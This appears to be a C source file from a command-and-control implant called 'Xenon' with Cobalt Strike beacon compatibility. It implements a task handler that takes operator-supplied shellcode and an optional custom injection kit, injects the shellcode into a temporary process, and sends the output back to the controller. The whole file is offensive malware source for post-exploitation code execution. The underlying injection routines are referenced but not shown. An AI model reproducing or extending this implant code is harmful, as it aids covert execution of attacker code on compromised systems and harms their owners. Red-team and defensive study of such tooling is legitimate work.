#include "Tasks/InjectShellcode.h"

#include "Xenon.h"
#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "Inject.h"
#include "BeaconCompatibility.h"
#include "Tasks/InlineExecute.h"

#ifdef INCLUDE_CMD_INJECT_SHELLCODE

/**
 * @brief Inject shellcode into temporary process and return output
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    BOOL   isProcessInjectKit     = FALSE;
    PBYTE  Shellcode              = NULL;
    PCHAR  injectKitBof           = NULL;
    SIZE_T scLength               = 0;
    SIZE_T kitLen                 = 0;
    PCHAR  Output                 = NULL;
    SIZE_T OutLen                 = 0;

    /* Parse command arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    if ( nbArg > 1 )
    {
        isProcessInjectKit = TRUE;
    }
    
    
    /* Get shellcode bytes */
    PCHAR shellcodeData = ParserGetString(arguments, &scLength);

    if ( shellcodeData == NULL || scLength <= 8 ) 
    {
        _err("Failed to parse shellcode bytes from arguments.");
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }
    Shellcode = (PBYTE)(shellcodeData + 8);  // Skip 8 bytes (typed array header)
    scLength  -= 8;

    _dbg("Received shellcode - %d bytes", scLength);

    /* Parse process injection kit if enabled */
    if ( isProcessInjectKit ) 
    {
        injectKitBof = ParserGetString(arguments, &kitLen);
        injectKitBof += 8;  // Skip 8 bytes (typed array header)
        kitLen       -= 8;
        _dbg("[+] Using Custom Process Injection Kit. %d bytes", kitLen);
    }

    /* Inject shellcode ( default | custom kit ) */
    if ( isProcessInjectKit ) 
    {
        if ( !InjectCustomKit(Shellcode, scLength, injectKitBof, kitLen, &Output, &OutLen) ) 
        {
            DWORD error = GetLastError();
            _err("[!] Failed to inject with kit. ERROR : %d\n", error);
            PackageError(taskUuid, error);
            return;
        }
    } 
    else 
    {
        if ( !InjectDefault(Shellcode, scLength, &Output, &OutLen) ) 
        {
            DWORD error = GetLastError();
            _err("[!] Failed to inject with default method. ERROR : %d\n", error);
            PackageError(taskUuid, error);
            return;
        }
    }

    _dbg("[+] Done injecting.");

    // Output
    PPackage data = NULL;
    if ( Output != NULL && OutLen != 0 )
    {
        data = PackageInit(0, FALSE);
        PackageAddString(data, Output, FALSE);
    }

    // Success
    PackageComplete(taskUuid, data);
    
END:
    // Cleanup
    PackageDestroy(data);
    if (Output) free(Output);
}

#endif // INCLUDE_CMD_INJECT_SHELLCODE